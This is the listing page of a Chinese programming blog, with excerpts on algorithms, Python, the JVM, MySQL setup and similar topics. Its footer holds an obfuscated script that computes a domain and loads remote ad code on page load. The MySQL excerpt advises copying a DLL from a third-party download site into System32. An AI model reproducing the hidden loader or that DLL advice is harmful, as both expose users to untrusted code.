</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cf49a17001d9af83a3c4f2b4a2fd0f5/" rel="bookmark">
			ST表模板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;iostream&gt; using namespace std; // f[i, j] = [i, 2^j-1] 的最大值 即： 从i开始， 连续 2^j 个数的最大值。 const int N = 1e5 + 5; int arr[N]; int ST[N][18]; int log2[N] = {-1}; int read() { int x = 0, f = 1; char c = getchar(); while(c &lt; '0' || c &gt; '9') { if(c == '-') f = 1; c = getchar(); } while(c &gt;= '0' &amp;&amp; c &lt;= '9') { x = x * 10 + c - 48; c = getchar(); } return x*f; } int main() { int n = read(), m = read(); for(int i = 1; i &lt;= n; i++) { arr[i] = read(); log2[i] = log2[i/2] + 1; ST[i][0] = arr[i]; } for(int j = 1; j &lt;= log2[n]; j++) { for(int i = 1; i + (1&lt;&lt;j)-1 &lt;= n; i++) { ST[i][j] = max(ST[i][j-1], ST[i+(1&lt;&lt;(j-1))][j-1]); } }	int l, r, k; for(int i = 0; i &lt; m; i++) { l = read(); r = read(); k = log2[r-l+1]; printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1cf49a17001d9af83a3c4f2b4a2fd0f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b792f29f03e6208f1ae2340d6a99b77f/" rel="bookmark">
			python字符串的比较
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 关于其中字符串类型id引用驻留机制见python中的字符串的驻留机制
字符串的比较操作： 运算符：&gt;,&gt;=,&lt;,&lt;=,==,!= 比较规则:首先比较两个字符串中的第- -个字符，如果相等则继续比较下一个字符，依次比较下去，直到两个字符串中的字符不相等时，其比较结果就是两个字符串的比较结果，两个字符串中的所有后续字符将不再被比较 比较原理:两字符进行比较时，比较的是其ordinal value(原始值),调用内置函数ord可以得到指定字符的ordinal value（ASCII码）。与内置函数ord对应的是内置函数chr,调用内置函数chr时指定ordinal value可以得到其对应的字符 == 与 is 的区别： == 比较的是value is 比较的是id """ 字符串的比较操作： 运算符：&gt;,&gt;=,&lt;,&lt;=,==,!= 比较规则:首先比较两个字符串中的第- -个字符，如果相等则继续比较下一个字符，依次比较下去，直到两个字符串中的字符不相等时，其比较结果就是两个字符串的比较结果，两个字符串中的所有后续字符将不再被比较 比较原理:两字符进行比较时，比较的是其ordinal value(原始值),调用内置函数ord可以得到指定字符的ordinal value（ASCII码）。与内置函数ord对应的是内置函数chr,调用内置函数chr时指定ordinal value可以得到其对应的字符 == 与 is 的区别： == 比较的是value is 比较的是id """ print("hello" &gt; "hel") print("hello" &gt; "interest") # 第二个，解释： print(ord("h"), ord("i")) # 104&lt;145 a=b="123" c="123" print(a == b) print(a is b) print(a == c) print(a is c) # 此处显示为true是因为，pycharm做了优化，“123”在驻留池中，a，b，c存储的都是对“123”的引用 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/682c4f9aebe3466eec7a9806d43e7741/" rel="bookmark">
			【欧拉函数】 欧拉函数计算及打表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一.欧拉函数简介二.欧拉函数计算三.欧拉函数值打表四.练手题目 一.欧拉函数简介 在数论中，对正整数n，欧拉函数是小于或等于n的正整数中与n互质的数的数目（因此φ(1)=1）。此函数以其首名研究者欧拉命名(Euler’s totient function)，它又称为Euler’s totient function、φ函数、欧拉商数等。 例如φ(8)=4，因为1,3,5,7均和8互质。
注：a,b互质即gcd(a,b)=1
二.欧拉函数计算 计算公式 φ ( n ) = n ⋅ ∏ i = 1 k ( 1 − 1 p i ) φ(n)=n\cdot \prod_{i=1}^k(1-\frac{1}{p_i}) φ(n)=n⋅∏i=1k​(1−pi​1​)，其中，pi为n的质因数
即根据质因数分解定理，将一个数n分解成有限个质数的乘积： n = p 1 a 1 ⋅ p 2 a 2 ⋅ p 3 a 3 ⋅ p 4 a 4 ⋅ ⋅ ⋅ ⋅ n=p_1^{a1}\cdot p_2^{a2}\cdot p_3^{a3}\cdot p_4^{a4}\cdot\cdot\cdot\cdot n=p1a1​⋅p2a2​⋅p3a3​⋅p4a4​⋅⋅⋅⋅
则， φ ( n ) = n ⋅ ( 1 − 1 p 1 ) ⋅ ( 1 − 1 p 2 ) ⋅ ( 1 − 1 p 3 ) ⋅ ⋅ ⋅ ⋅ φ(n)=n\cdot (1-\frac{1}{p_1})\cdot (1-\frac{1}{p_2})\cdot (1-\frac{1}{p_3})\cdot\cdot\cdot\cdot φ(n)=n⋅(1−p1​1​)⋅(1−p2​1​)⋅(1−p3​1​)⋅⋅⋅⋅
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/682c4f9aebe3466eec7a9806d43e7741/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19383bb2059335210be42c94f830bf59/" rel="bookmark">
			uniapp引入微信小程序直播组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、在javashop-uniapp工程的manifest.json文件中引入直播插件 "mp-weixin" : { /* 小程序特有相关 */ "usingComponents" : true, "appid" : "xxx", "plugins": { "live-player-plugin": { // 注意填写该直播组件最新版本号，微信开发者工具调试时可获取最新版本号（复制时请去掉注释） "version": "1.0.15", // 必须填该直播组件appid，该示例值即为直播组件appid（复制时请去掉注释） "provider": "wx2b03c6e691cd****" } } } 二、通过直播间列表接口查询直播间列表，显示在小程序中 三、点击任意一个电商直播间，跳转到小程序直播组件即可。 易族智汇（javashop）原创文章 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b31515857b849b48323e898f672e905/" rel="bookmark">
			计算机与代数---如何计算pow---方法和实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0.简介 前面实现了log2,我就顺势用这个函数来构造求a^x的结果。
1.方法推导 我们通过关系式子的变换可以得到等式，这样一来我们只需要针对2的n次幂来求解。将2^x泰勒展开，ln2我们可以预先求出。
对于幂大于1的情况，例如，变换成，因为比较容易计算，利用泰勒展开式计算，这里要处理一下幂是负数的时候，然后将所有小数的幂次都直接带入泰勒展开式，大于1的部分直接计算就可以。
2.实现 #include&lt;iostream&gt; #include&lt;ctime&gt; using namespace std; #define LN2 0.69314718055994530941723212145818 typedef double ldouble; double baselog2(double n) { n-=1; double x = -1,result = 0; for (int i = 1; i &lt; 30; i++) result += ((x = x * n * -1) / i); return result/LN2; } double mylog2(double n) { double result = 0; if (n &gt;= 0.5 &amp;&amp; n &lt;= 1) result = baselog2(n); else if (n &gt;= 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b31515857b849b48323e898f672e905/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8414ec2faa0f32a9bea8f22867a1684d/" rel="bookmark">
			200w的数据量能够占多大内存？发生了OOM如何进行JVM调优？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由OOM牵扯出的JVM分析与调优案例 案例介绍200w数据能占多大的内存OOM异常点分析定位异常点代码层面优化的过程JVM优化逻辑梳理 案例介绍 A平台是一个数据转换和转发平台，需要从数据库读取200w数据，进行数据转换（包括数据清理），将转换后的数据转成json格式，转换后的json格式转成字节数组，然后转发到其他平台。起初这个平台在数据量不大的时候没有任何问题，但是当读取200w数据时就会出现OOM。
200w数据能占多大的内存 当出现OOM的时候，我们会想到是什么导致的OOM。我们首先计算一下200w数据能够占有多大的内存空间。经过计算一个对象将近有4KB的大小。（5个String （每个字符串的长度很长） 2个Long 一个Integer 一个Boolean）。对象内存的计算方法：对象内存=对象头+实例数据+填充数据。未开启指针压缩的对象头一般是12B（数组16B）。
举个例子：如何计算内存（可以通过Instrumentation接口来测试）
String str=“abcdefg”，这个占用多少字节？首先String的构造（int hash和一个char数组）对象=对象头（12）+实例化数据（4（int）+4（char指针））+填充（4）=24（原来是20 不满足，填充了4个字节）。所以String对象占用24字节，那么空字符串占用=24+char[]数组（16（对象头））=40。
那么str的内存=40+7乘2（char 占两个）=54 +2（填充）=56
HashMap的内存计算=table数组+table数组中每个元素entry的内存。ArrayLsit的计算方式同理
由于扩容，List和map中未使用的空间依然很大。
由此经过数据库读取的200w数据转化成List 的内存大小为 4KB*200w约等于8GB（mybatis返回的List的实现其实是ArrayList，这里没有算入）。 OOM异常点分析 查看日志发现，后台打印出频繁的Full GC，并且GC后的可使用内存并没有发生变化。经过多次Full GC之后 OOM。此时并不知道什么原因，我将虚拟内存增大至25G，在12min后终于执行成功。
这么长时间，这么大内存。运维手持40米砍刀走来。。。。
定位异常点 首先8G的内存是经过多次转换的，从数据转换到json的List，每个对象都是new出来的强引用，GC无法回收，随着对象的不断增加，Full GC频繁，因此造成8G数据内存吃下25G的内存容量（个人分析）。通过jamp jstate命令分析，dump转储内存快照，用Mat进行可视化，发现List太长。
代码层面优化的过程 数据库读取使用limit来限制读取的数据量（分批次读取数据，30w为一组）
但是出现了 java.lang.ArrayIndexOutOfBoundsException：-1” 的异常，这里分析原因是每个对象转换成json也是存在一个数组中，这个数组的下标是int类型，由此推断超过了int的范围。（不知道为什么一次性读取确成功了，而分批次却出现这个问题）省去转换成json这一步（写入txt文件）
直接写入文件中（txt文件可以存储几亿行数据，满足需求），由系统命令压缩（gzip），然后变成字节数组（让下游服务修改了逻辑 - -！）。提升时间效率（优化数据库查询）
数据库Limit读取是可以优化的点，因为Limit 100000 ，需要扫描定位到1000000行数据，如果数据量达到千万级，每次查询均需要扫描，性能会大大降低。使用cursor（游标），cursor适用于顺序且不支持跳页，也就是说每次查询的最后一条记录，自动作为下一次的起始记录，这样省去了扫描操作。通过游标读取，每30w数据量写入文件一次。读取完成后进行一次System.gc()。 经过此次优化流程可以将内存将至12G 时间稳定在6min中
我以为结束了，但是我查看了GC日志，YoungGC依旧频繁，Full GC依旧存在，虽然没有那么频繁，但是每次有5s左右的停顿。这仍不能满足我们的要求。
JVM优化 查看日志显示，Yong GC仍然频繁，并且平均8次左右触发一次Full GC。经过分析：一次Full GC相当于Young GC 、Old GC和元空间GC同时进行，耗费的时间可想而知。而且频繁的Young GC 也表明新生代的内存在不断的收集中。经过7、8次Yong GC之后通过动态对象年龄判断会直接进入老年代，由于对象的不可清除，导致老年代内存增加，担保失败（HandlePromotionFailure）而导致Full GC。
经过计算，30w数据量大约在1.2G。这里需要调整老年代、 eden、 s0和s1的内存。由于对象是一直存活的，并且尽可能减少的Full GC的次数。最终将虚拟机调整至5G，老年代：新生代=7:3 、eden：s0=5:1。
调整后的虚拟机内存至5G，总的处理时间为4min。
关于参数的调整：List属于大对象一开始就会进入老年代，而在List进行数据转换的时候依然会产生很多内存的消耗，所以我这里调整了一下eden和survivor的比例。并且增大老年代的比例。
关于从25G降至12G再降低至6G，时间从12min降到6min再降低至4min，为何内存降低竟有如此效果？
25G到12G是因为改变了代码逻辑，所以时间降低。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8414ec2faa0f32a9bea8f22867a1684d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e112ef74c88fcc97884edf498ec53ad/" rel="bookmark">
			Ant design pro常用(9):Tabs的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 import {Tabs} from 'antd'; class OperateComponent extends Component{ render(){ //设置destroyInactiveTabPane，不然会渲染多次（小于TabPane的长度） &lt;div className="company_model"&gt; &lt;div className="card-container"&gt; &lt;Tabs type="card" activeKey={this.state.activeKey} destroyInactiveTabPane onChange={(activeKey)=&gt;this.modelTabChange(activeKey)}&gt; &lt;TabPane tab='公司信息' key='company'&gt; { !customerItem.company ? &lt;CompanyEmpty /&gt; : &lt;CompanyInfo companyInfo={companyInfo}/&gt; } &lt;/TabPane&gt; &lt;TabPane tab='流量' key='traffic'&gt; &lt;CompanyEmpty /&gt; &lt;/TabPane&gt; &lt;TabPane tab='摄像头' key='camera'&gt; &lt;CompanyEmpty /&gt; &lt;/TabPane&gt; &lt;TabPane tab='订单信息' key='order'&gt; { !customerItem.company ? &lt;CompanyEmpty /&gt; : &lt;OrderList owner={customerItem.company} type='single'/&gt; } &lt;/TabPane&gt; &lt;/Tabs&gt;	&lt;/div&gt; &lt;/div&gt; } } //TabPane要一个一个写出来，不能用方法调用return 出来，如果用方法调用出来 ，每一个TabPane方法就会调用2次 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ce2eb7e03d09847ef8821a7b5d5dcf9/" rel="bookmark">
			苹果照片未删却不见了_iPhone手机照片不见的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		遇到iPhone手机中的照片不见了这种问题，相信大家都很着急！不过着急也没用，照片也不会自己回来，SO!跟着清弦瞧瞧下面几种iPhone手机照片不见的解决方法吧！
一、ios系统BUG：
iPhone系统有时会出现一些BUG，导致iPhone手机上面的部分照片不见。当我们遇到iPhone照片突然不见的时候，请先把手机关机重启一下，之后开机起来，在查看iPhone照片里面是否可以显示出消失的照片了。
二、关闭iCloud照片流导致的问题：
如果您将照片保存在苹果iCloud照片流的话，那么关闭掉iCloud照片流同时，就无法查看到保存的照片了。
这种情况导致的照片不见了，我们只要依次登录苹果iCloud账号-点击照片-将我的照片流开启，之后连接无线网络，iCloud云端上面储存的照片就会自动同步回来。
三、如果是不小心错误删除掉的话，那么请查看一下iPhone照片，在最近删除里面打开看看是否有误删的照片没有，如果有的话，我们可以点击恢复照片还原。
以上就是清弦所知道的几种iPhone手机照片不见的恢复方法，不知道果粉们学会了吗？
关注微信公众号：果粉每日科技，了解最新的苹果新闻和ios技巧。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e211452b580b0153e387716c39104559/" rel="bookmark">
			windows安装使用mysql笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载或复制粘贴请说明出处,(打字很累) 以win10 64位系统、mysql8.0版本为例
目录 *转载或复制粘贴请说明出处,(打字很累)* 一，下载mysql1. 下载链接2.点击下载 二、安装mysql1.解压、排错2.配置默认文件3.安装与启动mysql4.登录mysql*走到了这一步的算是正式安装完mysql，撒花、撒花、撒花，有什么错误请指正，希望这篇文章对兄弟姐妹们有所帮助* 一，下载mysql 1. 下载链接 1.1 下载链接： https://www.mysql.com/downloads/mysql/ 下面是进入后的图：
两个版本都可以，我选的是第一个(191.4M)的那个版本
2.点击下载 2.1 第一次进入的话需要登录或注册Oracle账号，不用慌张按照提示操作，有账号的登录，没有的按照流程申请就行。 2.1.1 登录后会出现下载提示(下图)，点击下载，没有出现的，按照 上述流程走一遍就行 下载提示
最后开始静静的等待下载完，第一步就结束了
二、安装mysql 1.解压、排错 1.1 解压下载好的压缩包，看下图 1.解压此压缩包（注意：你挤压的路径就是你安装路径，可以切换，反正我一般都安装在D盘中，看个人习惯）
2.解压后得到同名文件夹
3.内部文件有
咱们下载的ZIP Archive版是免安装的。只要解压就行了
1.2 这时候你可以试试点，\bin里面的mysql.exe，他应该会出现一个一闪而过的黑框，这是正常的情况，因为咱们还没有装完。 1.2.1 有的兄弟可能会出现 无法启动此程序 由于找不到VCRUNTIME140_1的错误。那是因为缺少VCRUNTIME140_1，解决方法如下（没有出现的兄弟跳过，进入下个阶段）： 1.下载链接：https://cn.dll-files.com/vcruntime140_1.dll.html
打开后页面，如下图，随便下载一个版本就行，我下载的是最新的版本。
2. 解压压缩包，找到vcruntime140_1.dll文件，看下图
3. 将vcruntime140_1.dll复制到C:\Windows\System32，注意, 如果下载的是32位版本的vcruntime140_1.dll需要复制到C:\Windows\SysWOW64下。看图（我下的是64的）：
4. 结束，进入下个步骤，配置文件
2.配置默认文件 2.1 在\bin的同级目录下添加一个my.ini配置文件,看图 2.2 代码如下(配置代码网上很多，我用的是这个)： [mysql] # 设置mysql客户端默认字符集 default-character-set=utf8 [mysqld] #设置3306端口 port = 3306 # 设置mysql的安装目录 basedir=D:\mysql-8.0.22-winx64 # 设置mysql数据库的数据的存放目录 datadir=D:\mysql-8.0.22-winx64\data # 允许最大连接数 max_connections=200 # 服务端使用的字符集默认为8比特编码的latin1字符集 character-set-server=utf8 # 创建新表时将使用的默认存储引擎 default-storage-engine=INNODB 注意basedir，datadir这两个参数，路径填写你当前的绝对路径（data目录不用创建，不用创建，不用创建，待会运行会自动创建）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e211452b580b0153e387716c39104559/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/405/">«</a>
	<span class="pagination__item pagination__item--current">406/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/407/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>